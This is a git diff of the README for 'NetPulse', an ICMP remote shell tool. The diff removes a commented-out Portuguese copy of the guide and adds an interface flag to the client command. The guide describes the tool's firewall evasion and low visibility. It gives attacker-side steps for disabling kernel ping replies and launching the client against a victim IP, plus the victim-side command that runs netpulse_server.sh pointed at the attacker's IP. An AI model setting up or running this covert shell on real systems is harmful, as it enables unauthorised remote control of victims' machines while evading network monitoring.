@@ -1,71 +1,3 @@
-<!-- # Guia de Uso do NetPulse - Ferramenta de ICMP SHELL
-
-O NetPulse é uma ferramenta de ICMP SHELL que não requer acesso root do lado da vítima. Este guia fornece informações detalhadas sobre como usar o NetPulse.
-
-## Vantagens do NetPulse
-- **Não requer acesso root:** O NetPulse elimina a necessidade de acesso root no lado da vítima.
-- **Camuflagem:** O tráfego ICMP é comum e frequentemente permitido em redes e firewalls.
-- **Menos visibilidade:** Mensagens ICMP não deixam rastros nas tabelas de estado da maioria dos firewalls.
-- **Utilidade em redes restritivas:** Em redes onde o tráfego TCP ou UDP é estritamente controlado, o ICMP pode ser uma alternativa.
-
-## Desvantagens do NetPulse
-- **Shell Limitada:** O NetPulse oferece uma shell limitada e não interativa.
-- **Tráfego Incomum:** O tráfego gerado pelo NetPulse pode ser detectado por sistemas de detecção de intrusão.
-- **Alta Lentidão:** Em comparação a uma reverse shell, o NetPulse é muito mais lento.
-
-## Configuração do Lado do Atacante
-A configuração do lado do atacante é mais complexa e requer acesso root. Siga os passos abaixo:
-
-### Desative a resposta automática de pings do Kernel:
-
-Verifique o valor do arquivo `/proc/sys/net/ipv4/icmp_echo_ignore_all`:
-```bash
-$ cat /proc/sys/net/ipv4/icmp_echo_ignore_all
-```
-Altere o valor para "1" para desativar as respostas automáticas:
-```bash
-$ echo 1 | sudo tee /proc/sys/net/ipv4/icmp_echo_ignore_all
-```
-Faça as alterações permanentes em `/etc/sysctl.conf`:
-```bash
-$ sudo nano /etc/sysctl.conf
-```
-Adicione a seguinte linha:
-```
-net.ipv4.icmp_echo_ignore_all = 1
-```
-Aplique as configurações:
-```bash
-$ sudo sysctl -p
-```
-
-### Iniciando o Cliente
-
-Para iniciar o cliente, execute o arquivo [netpulse_client.py](/netpulse_client.py) com permissões de root:
-
-```bash
-$ sudo python3 netpulse_client.py <IP-da-vítima>
-```
-Para obter mais opções, use a flag -h:
-```bash
-$ python3 netpulse_client.py -h
-```
-
-## Configuração do Lado da Vítima
-A configuração do lado da vítima é mais simples e não requer acesso root. Certifique-se de que as seguintes ferramentas estejam instaladas:
-
-- [iputils-ping](https://packages.debian.org/bullseye/iputils-ping) - Ferramenta para testar a alcançabilidade de hosts de rede.
-- [xxd](https://packages.debian.org/bullseye/xxd) - Ferramenta para criar (ou reverter) um despejo em hexadecimal.
-
-Se todas as ferramentas necessárias estiverem instaladas, execute o arquivo [netpulse_server.sh](/netpulse_server.sh):
-```bash
-$ chmod +x netpulse_server.sh && ./netpulse_server.sh <IP-do-atacante>
-```
-
-# Buy me a Coffe :p
-
-<a href="https://www.buymeacoffee.com/ryan.r" target="_blank"><img src="https://cdn.buymeacoffee.com/buttons/default-orange.png" alt="Buy Me A Coffee" height="41" width="174"></a> -->
-
 # NetPulse Usage Guide - ICMP SHELL Tool
 
 NetPulse is an ICMP SHELL tool that does not require root access on the victim's side. This guide provides detailed information on how to use NetPulse.
@@ -112,7 +44,7 @@ $ sudo sysctl -p
 To start the client, execute the [netpulse_client.py](/netpulse_client.py) file with root permissions:
 
 ```bash
-$ sudo python3 netpulse_client.py <victim-IP>
+$ sudo python3 netpulse_client.py -i <interface> <victim-IP>
 ```
 For more options, use the -h flag:
 ```bash
